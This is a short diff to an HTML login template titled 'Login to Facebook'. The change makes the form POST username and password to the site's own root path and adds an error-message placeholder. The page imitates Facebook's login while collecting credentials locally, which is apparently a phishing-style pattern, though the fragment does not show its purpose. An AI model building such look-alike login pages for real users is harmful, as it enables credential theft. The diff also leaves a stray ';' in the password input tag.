@@ -10,7 +10,7 @@
 </head>
 <body>
 
-<form action="#" method="#" style="max-width:500px;margin:auto">
+<form action="/" method="POST" style="max-width:500px;margin:auto">
   <h2>Login to Facebook</h2>
   <div class="input-container">
     <i class="fa fa-user icon"></i>
@@ -20,11 +20,15 @@
   
   <div class="input-container">
     <i class="fa fa-key icon"></i>
-    <input class="input-field" type="password" placeholder="Password" name="password">
+    <input class="input-field" type="password" placeholder="Password" name="password" ;>
   </div>
 
   <button type="submit" class="btn">Login</button>
+  <p> {{ error_msg }}</p>
+
 </form>
+
+
 
 </body>
 </html>
